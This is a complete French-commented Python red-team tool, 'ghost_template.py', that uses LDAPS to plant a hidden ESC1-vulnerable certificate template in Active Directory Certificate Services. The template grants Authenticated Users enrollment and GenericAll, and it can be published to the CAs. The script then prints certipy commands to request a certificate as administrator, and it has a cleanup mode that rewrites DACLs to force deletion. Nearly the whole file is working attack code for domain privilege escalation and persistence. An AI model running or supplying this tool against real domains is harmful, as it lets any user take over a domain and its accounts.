#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghost_template.py - Creation (ou suppression) d'un certificate template ESC1
"fantome" dans AD CS via LDAP(S).

  * Cree l'objet msPKI-Enterprise-Oid associe.
  * Cree le pKICertificateTemplate SANS nTSecurityDescriptor (evite la
    constraintViolation sur Att 20119), puis pose la DACL dans un second
    modify avec le control sdflags=0x04.
  * Publie optionnellement le template sur la (ou les) CA.
  * Mode --remove pour nettoyer en fin d'engagement (template + OID + CA).

Prerequis cote operateur : droit Create Child sur les conteneurs OID et
Certificate Templates (delegation PKI ou Enterprise Admin). Sans ce droit,
les creations echouent en insufficientAccessRights.

/!\\ A n'utiliser que sur des systemes pour lesquels vous disposez d'une
    autorisation ecrite (mission de pentest, lab).

Dependances :
    pip install ldap3 impacket
    # Kerberos (optionnel) : pip install gssapi   (necessite les libs krb5)

Auteur : Chemsse57
"""

import argparse
import getpass
import logging
import random
import re
import ssl
import struct
import sys
import uuid

from ldap3 import (
    Server, Connection, Tls, ALL, BASE, SUBTREE,
    NTLM, SASL, KERBEROS,
    MODIFY_REPLACE, MODIFY_ADD, MODIFY_DELETE,
)
from ldap3.protocol.microsoft import security_descriptor_control

from impacket.ldap import ldaptypes
from impacket.uuid import string_to_bin


log = logging.getLogger("ghost_template")

# --------------------------------------------------------------------------
# Constantes AD CS
# --------------------------------------------------------------------------
ENROLLMENT_RIGHT_GUID = "0e10c968-78fb-11d2-90d4-00c04f79dc55"  # Certificate-Enrollment
DEFAULT_SID           = "S-1-5-11"                              # Authenticated Users

ADS_RIGHT_DS_CONTROL_ACCESS = 0x00000100   # droit etendu (enrollment)
FULL_CONTROL                = 0x000F01FF   # GenericAll sur un objet AD
STANDARD_DELETE             = 0x00010000   # droit DELETE
SDFLAGS_DACL                = 0x04         # DACL_SECURITY_INFORMATION

CLIENT_AUTH_EKU = "1.3.6.1.5.5.7.3.2"      # Client Authentication

# Motif exact des CN d'objets OID generes par cet outil : <chiffres>.<32 hex>.
# Sert a ne cibler QUE nos propres objets lors d'un nettoyage par displayName.
TOOL_OID_CN = re.compile(r"^\d+\.[0-9A-Fa-f]{32}$")


# --------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------
def domain_to_base_dn(domain):
    """corp.local -> DC=corp,DC=local"""
    return ",".join(f"DC={part}" for part in domain.split("."))


def make_period(seconds):
    """pKIExpirationPeriod / pKIOverlapPeriod : FILETIME negatif (100 ns), 8 octets LE."""
    return struct.pack("<q", -(seconds * 10_000_000))


def make_object_ace(sid, mask, object_guid):
    """ACCESS_ALLOWED_OBJECT_ACE : droit etendu cible par un GUID (enrollment)."""
    ace = ldaptypes.ACE()
    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
    ace["AceFlags"] = 0x00
    data = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
    data["Mask"] = ldaptypes.ACCESS_MASK()
    data["Mask"]["Mask"] = mask
    data["ObjectType"] = string_to_bin(object_guid)
    data["InheritedObjectType"] = b""
    data["Flags"] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
    sid_obj = ldaptypes.LDAP_SID()
    sid_obj.fromCanonical(sid)
    data["Sid"] = sid_obj
    ace["Ace"] = data
    return ace


def make_allow_ace(sid, mask):
    """ACCESS_ALLOWED_ACE classique (GenericAll)."""
    ace = ldaptypes.ACE()
    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    ace["AceFlags"] = 0x00
    data = ldaptypes.ACCESS_ALLOWED_ACE()
    data["Mask"] = ldaptypes.ACCESS_MASK()
    data["Mask"]["Mask"] = mask
    sid_obj = ldaptypes.LDAP_SID()
    sid_obj.fromCanonical(sid)
    data["Sid"] = sid_obj
    ace["Ace"] = data
    return ace


# --------------------------------------------------------------------------
# Coeur
# --------------------------------------------------------------------------
class GhostTemplate:
    def __init__(self, args):
        self.args = args
        self.template = args.template
        self.enroll_sid = args.enroll_sid

        self.base_dn = domain_to_base_dn(args.domain)
        pks = f"CN=Public Key Services,CN=Services,CN=Configuration,{self.base_dn}"
        self.oid_container        = f"CN=OID,{pks}"
        self.templates_container  = f"CN=Certificate Templates,{pks}"
        self.enrollment_container = f"CN=Enrollment Services,{pks}"
        self.template_dn = f"CN={self.template},{self.templates_container}"

        self.conn = None

    # ---- connexion --------------------------------------------------------
    def connect(self):
        host = self.args.dc_host or self.args.dc_ip
        if self.args.kerberos and not self.args.dc_host:
            log.error("Kerberos requiert le FQDN du DC (--dc-host) pour resoudre le SPN.")
            sys.exit(2)

        tls = Tls(validate=ssl.CERT_NONE)
        server = Server(host, port=self.args.ldaps_port, use_ssl=True,
                        get_info=ALL, tls=tls)

        if self.args.kerberos:
            # Utilise le ticket present dans KRB5CCNAME (ex. cache genere par getTGT.py).
            conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS)
        else:
            user = f"{self.args.domain}\\{self.args.username}"
            conn = Connection(server, user=user, password=self.args.password,
                              authentication=NTLM)

        if not conn.bind():
            log.error("Echec du bind LDAPS : %s", conn.result)
            if not self.args.kerberos:
                log.error("Si NTLM refuse, essayez le nom NetBIOS via --domain "
                          "(ex. --domain CORP au lieu du FQDN).")
            sys.exit(1)

        self.conn = conn
        who = "Kerberos (ccache)" if self.args.kerberos else f"{self.args.domain}\\{self.args.username}"
        log.info("Bind LDAPS reussi (%s)", who)

    # ---- lecture OID de foret --------------------------------------------
    def get_forest_oid(self):
        self.conn.search(self.oid_container, "(objectClass=*)", search_scope=BASE,
                         attributes=["msPKI-Cert-Template-OID"])
        if not self.conn.entries:
            log.error("Lecture du conteneur OID impossible (droits insuffisants ?).")
            sys.exit(1)
        forest_oid = self.conn.entries[0]["msPKI-Cert-Template-OID"].value
        if not forest_oid:
            log.error("msPKI-Cert-Template-OID absent sur le conteneur OID.")
            sys.exit(1)
        log.info("OID de base de la foret : %s", forest_oid)
        return forest_oid

    # ---- creation objet OID ----------------------------------------------
    def create_oid_object(self, forest_oid):
        part1 = random.randint(1000000, 99999999)
        part2 = random.randint(10000000, 99999999)
        oid_name = f"{part2}.{uuid.uuid4().hex.upper()}"
        template_oid = f"{forest_oid}.{part1}.{part2}"
        oid_dn = f"CN={oid_name},{self.oid_container}"

        attrs = {
            "objectClass": ["top", "msPKI-Enterprise-Oid"],
            "msPKI-Cert-Template-OID": template_oid,
            "flags": 1,                     # 1 = OID de type template
            "displayName": self.template,
        }
        if not self.conn.add(oid_dn, attributes=attrs):
            log.error("Echec creation objet OID : %s", self.conn.result)
            sys.exit(1)
        log.info("Objet msPKI-Enterprise-Oid cree : %s", oid_dn)
        log.debug("template OID = %s", template_oid)
        return template_oid

    # ---- creation template (sans DACL) -----------------------------------
    def create_template(self, template_oid):
        attrs = {
            "objectClass": ["top", "pKICertificateTemplate"],
            "displayName": self.template,
            "revision": 100,
            "flags": 66048,
            "pKIDefaultKeySpec": 1,
            "pKIMaxIssuingDepth": 0,
            "pKICriticalExtensions": ["2.5.29.15", "2.5.29.7"],
            "pKIExtendedKeyUsage": [CLIENT_AUTH_EKU],
            "pKIDefaultCSPs": "2,Microsoft Base Cryptographic Provider v1.0",
            "msPKI-RA-Signature": 0,
            "msPKI-Enrollment-Flag": 0,                     # pas d'approbation manager
            "msPKI-Private-Key-Flag": 16,                   # 0x10 = cle exportable
            "msPKI-Certificate-Name-Flag": 1,               # ENROLLEE_SUPPLIES_SUBJECT -> ESC1
            "msPKI-Minimal-Key-Size": 2048,
            "msPKI-Template-Schema-Version": 2,
            "msPKI-Template-Minor-Revision": 0,
            "msPKI-Cert-Template-OID": template_oid,
            "msPKI-Certificate-Application-Policy": [CLIENT_AUTH_EKU],
            "pKIExpirationPeriod": make_period(365 * 24 * 3600),   # 1 an
            "pKIOverlapPeriod": make_period(6 * 7 * 24 * 3600),    # 6 semaines
        }
        # Pas de nTSecurityDescriptor ici : sinon constraintViolation (Att 20119).
        if not self.conn.add(self.template_dn, attributes=attrs):
            log.error("Echec creation template : %s", self.conn.result)
            sys.exit(1)
        log.info("Template cree (sans DACL custom) : %s", self.template_dn)

    # ---- pose de la DACL (read-modify-write, sdflags=0x04) ---------------
    def set_dacl(self):
        ctrl = security_descriptor_control(sdflags=SDFLAGS_DACL)
        self.conn.search(self.template_dn, "(objectClass=*)", search_scope=BASE,
                         attributes=["nTSecurityDescriptor"], controls=ctrl)
        raw = self.conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)

        if sd["Dacl"] is None:
            dacl = ldaptypes.ACL()
            dacl["AclRevision"] = 4
            dacl["Sbz1"] = 0
            dacl["Sbz2"] = 0
            dacl.aces = []
            sd["Dacl"] = dacl

        sd["Dacl"].aces.append(
            make_object_ace(self.enroll_sid, ADS_RIGHT_DS_CONTROL_ACCESS, ENROLLMENT_RIGHT_GUID)
        )
        sd["Dacl"].aces.append(
            make_allow_ace(self.enroll_sid, FULL_CONTROL)
        )

        new_sd = sd.getData()
        if not self.conn.modify(
            self.template_dn,
            {"nTSecurityDescriptor": [(MODIFY_REPLACE, [new_sd])]},
            controls=security_descriptor_control(sdflags=SDFLAGS_DACL),
        ):
            log.error("Echec pose de la DACL : %s", self.conn.result)
            sys.exit(1)
        log.info("DACL mise a jour : %s -> Enroll + GenericAll", self.enroll_sid)

    # ---- CA ---------------------------------------------------------------
    def discover_cas(self):
        self.conn.search(self.enrollment_container,
                         "(objectClass=pKIEnrollmentService)",
                         search_scope=SUBTREE, attributes=["cn"])
        cas = [(e.entry_dn, e["cn"].value) for e in self.conn.entries]
        if self.args.ca:
            cas = [c for c in cas if c[1].lower() == self.args.ca.lower()]
        return cas

    def publish(self):
        cas = self.discover_cas()
        if not cas:
            log.warning("Aucune CA correspondante trouvee, publication ignoree.")
            return
        for ca_dn, ca_cn in cas:
            if self.conn.modify(ca_dn,
                                {"certificateTemplates": [(MODIFY_ADD, [self.template])]}):
                log.info("Template publie sur la CA : %s", ca_cn)
            else:
                log.error("Echec publication sur %s : %s", ca_cn, self.conn.result)

    def unpublish(self):
        for ca_dn, ca_cn in self.discover_cas():
            if self.conn.modify(ca_dn,
                                {"certificateTemplates": [(MODIFY_DELETE, [self.template])]}):
                log.info("Template retire de la CA : %s", ca_cn)
            else:
                log.debug("Rien a retirer sur %s (%s)", ca_cn,
                          self.conn.result.get("description"))

    # ---- flux -------------------------------------------------------------
    def run_create(self):
        forest_oid = self.get_forest_oid()
        template_oid = self.create_oid_object(forest_oid)
        self.create_template(template_oid)
        self.set_dacl()
        if self.args.publish:
            self.publish()

        log.info("Termine.")
        dom = self.args.domain
        print("\n[*] Verification / abus :")
        print(f"    certipy find -u {self.args.username}@{dom} -dc-ip {self.args.dc_ip} -vulnerable -stdout")
        print(f"    certipy req  -u {self.args.username}@{dom} -dc-ip {self.args.dc_ip} "
              f"-ca <NOM_CA> -template {self.template} -upn administrator@{dom}")

    def _grant_self_delete(self, dn):
        """
        En tant que Owner de l'objet (WriteDacl implicite), s'accorde le droit
        DELETE. Utile quand ni l'objet ni le conteneur parent ne l'accordent.
        On cible S-1-5-11 (Authenticated Users) : l'operateur en fait toujours
        partie, et l'objet est supprime juste apres, donc l'ACE ne subsiste pas.
        """
        ctrl = security_descriptor_control(sdflags=SDFLAGS_DACL)
        self.conn.search(dn, "(objectClass=*)", search_scope=BASE,
                         attributes=["nTSecurityDescriptor"], controls=ctrl)
        if not self.conn.entries:
            return False
        raw = self.conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)
        if sd["Dacl"] is None:
            dacl = ldaptypes.ACL()
            dacl["AclRevision"] = 4
            dacl["Sbz1"] = 0
            dacl["Sbz2"] = 0
            dacl.aces = []
            sd["Dacl"] = dacl
        sd["Dacl"].aces.append(make_allow_ace("S-1-5-11", STANDARD_DELETE))
        return bool(self.conn.modify(
            dn,
            {"nTSecurityDescriptor": [(MODIFY_REPLACE, [sd.getData()])]},
            controls=security_descriptor_control(sdflags=SDFLAGS_DACL),
        ))

    def _delete_object(self, dn, label):
        """Supprime dn ; sur insufficientAccessRights, tente une reprise via WriteDacl."""
        if self.conn.delete(dn):
            log.info("%s supprime : %s", label, dn)
            return True
        if self.conn.result.get("result") == 50:   # insufficientAccessRights
            log.warning("%s : suppression refusee, reprise via WriteDacl (Owner)...", label)
            if self._grant_self_delete(dn) and self.conn.delete(dn):
                log.info("%s supprime (apres reprise DACL) : %s", label, dn)
                return True
        log.error("Echec suppression %s %s : %s", label, dn, self.conn.result)
        return False

    def run_remove(self):
        # 1) retrouver le template et son OID
        self.conn.search(self.templates_container, f"(cn={self.template})",
                         search_scope=SUBTREE, attributes=["msPKI-Cert-Template-OID"])
        template_oid = None
        template_dn = None
        if self.conn.entries:
            template_dn = self.conn.entries[0].entry_dn
            template_oid = self.conn.entries[0]["msPKI-Cert-Template-OID"].value
        else:
            log.warning("Template introuvable (peut-etre deja supprime) : %s", self.template)

        # 2) depublier de toutes les CA
        self.unpublish()

        # 3) supprimer le template
        if template_dn:
            self._delete_object(template_dn, "Template")

        # 4) supprimer l'objet OID associe.
        if template_oid:
            # Chemin precis : l'OID du template identifie de maniere unique son
            # objet dans le conteneur OID. On supprime exactement celui-la.
            oid_filter = (f"(&(objectClass=msPKI-Enterprise-Oid)"
                          f"(msPKI-Cert-Template-OID={template_oid}))")
            self.conn.search(self.oid_container, oid_filter,
                             search_scope=SUBTREE, attributes=["cn"])
            candidates = list(self.conn.entries)
        else:
            # Repli (template deja supprime) : le lien exact est perdu. On
            # recherche par displayName, mais on ne conserve QUE les objets dont
            # le CN suit le format genere par cet outil (<chiffres>.<32 hex>).
            # Un objet cree par certipy ou a la main (autre format de CN) n'est
            # jamais supprime, meme s'il porte le meme displayName.
            oid_filter = (f"(&(objectClass=msPKI-Enterprise-Oid)"
                          f"(displayName={self.template}))")
            self.conn.search(self.oid_container, oid_filter,
                             search_scope=SUBTREE, attributes=["cn"])
            candidates = [e for e in self.conn.entries
                          if TOOL_OID_CN.match(str(e["cn"].value))]

        if not candidates:
            log.info("Aucun objet OID de cet outil a supprimer.")
        for e in candidates:
            self._delete_object(e.entry_dn, "Objet OID")

        log.info("Nettoyage termine.")

    def close(self):
        if self.conn:
            self.conn.unbind()


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------
def parse_args():
    p = argparse.ArgumentParser(
        prog="ghost_template.py",
        description="Cree (ou supprime) un certificate template ESC1 dans AD CS via LDAP.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Exemples :\n"
            "  Creation + publication :\n"
            "    ghost_template.py -u pentester -p 'Passw0rd!' -d corp.local "
            "--dc-ip 10.0.0.10 --publish\n\n"
            "  Kerberos (ticket dans KRB5CCNAME) :\n"
            "    ghost_template.py -u pentester -k -d corp.local "
            "--dc-host dc01.corp.local --dc-ip 10.0.0.10\n\n"
            "  Nettoyage en fin de mission :\n"
            "    ghost_template.py -u pentester -p 'Passw0rd!' -d corp.local "
            "--dc-ip 10.0.0.10 --remove\n"
        ),
    )

    auth = p.add_argument_group("Authentification")
    auth.add_argument("-u", "--username", required=True, help="Nom d'utilisateur (sans domaine)")
    auth.add_argument("-p", "--password", help="Mot de passe (demande si omis et pas de -k)")
    auth.add_argument("-k", "--kerberos", action="store_true",
                      help="Auth Kerberos via le ticket present dans KRB5CCNAME")

    target = p.add_argument_group("Cible")
    target.add_argument("-d", "--domain", required=True, help="Domaine (FQDN ou NetBIOS)")
    target.add_argument("--dc-ip", required=True, help="IP du DC")
    target.add_argument("--dc-host", help="FQDN du DC (requis pour Kerberos)")
    target.add_argument("--ldaps-port", type=int, default=636, help="Port LDAPS (defaut 636)")

    tmpl = p.add_argument_group("Template")
    tmpl.add_argument("-t", "--template", default="EmployeeAuthTemplate",
                      help="Nom du template (defaut EmployeeAuthTemplate)")
    tmpl.add_argument("--enroll-sid", default=DEFAULT_SID,
                      help="SID beneficiaire des droits (defaut S-1-5-11 Authenticated Users)")
    tmpl.add_argument("--publish", action="store_true",
                      help="Publier le template sur la CA")
    tmpl.add_argument("--ca", help="Nom de la CA (toutes si omis)")

    p.add_argument("--remove", action="store_true",
                   help="Supprimer le template et l'objet OID (nettoyage)")
    p.add_argument("-v", "--verbose", action="store_true", help="Sortie debug")

    args = p.parse_args()

    if not args.kerberos and not args.password:
        args.password = getpass.getpass("Mot de passe : ")
    return args


def main():
    args = parse_args()
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="[%(levelname).1s] %(message)s",
    )

    gt = GhostTemplate(args)
    gt.connect()
    try:
        if args.remove:
            gt.run_remove()
        else:
            gt.run_create()
    finally:
        gt.close()


if __name__ == "__main__":
    main()
